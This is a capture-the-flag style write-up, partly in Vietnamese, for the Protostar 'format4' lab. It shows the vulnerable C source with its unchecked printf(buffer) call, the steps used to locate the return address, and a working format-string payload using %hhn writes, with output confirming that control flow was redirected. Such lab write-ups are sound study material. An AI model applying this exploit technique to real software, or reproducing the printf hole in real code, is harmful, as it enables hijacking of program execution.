# **format4**
## Source code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```

## Vulnerability
printf()

## Exploit
- Ghi đè lên return address của hàm printf() để chuyển hướng tới hàm hello().
=> Cần:
  - Tìm địa chỉ hàm hello()
  - Tìm địa chỉ ô stack chứa return address của printf()
  - Sử dụng kĩ thuật ghi đè bằng %n như những bài format trước để ghi đè địa chỉ hàm hello vào return address của printf()
  
=> Giải:
  - Địa chỉ hàm hello(): 0x080484b4
  - Địa chỉ ô stack chứa return address của printf():
    - Dễ dàng tìm được khi chạy debug bằng gdb. Tuy nhiên khi chạy thực tế thì stack bị xê dịch.
    - Đầu hàm vuln() có push ebp; Hiệu của giá trị ebp này với địa chỉ ô return address là cố định.
    - Khi dùng gdb, ebp = 0xbffff788, return address ở ô 0xbffff55c. Khoảng cách là 0x22c.
    - Khi chạy thật ở ngoài, dùng '%134x' có thể quan sát được ebp này = 0xbffff7d8. Trừ đi 0x22c => địa chỉ ô return address = 0xbffff5ac
  - String-attack: dùng hhn để ghi đè từng byte
    ```
    python -c 'print "\xad\xf5\xff\xbf" + "\xac\xf5\xff\xbf" + "%124x%4$hhn" + "%48x%5$hhn"'
    ```
- Kết quả:
```
user@protostar:/opt/protostar/bin$ python -c 'print "\xad\xf5\xff\xbf" + "\xac\xf5\xff\xbf" + "%124x%4$hhn" + "%48x%5$hhn"' | ./format4
��������                                                                                                                         200                                        b7fd8420
code execution redirected! you win
user@protostar:/opt/protostar/bin$
```

# References
- Format String exploitation tutorial: https://www.exploit-db.com/docs/english/28476-linux-format-string-exploitation.pdf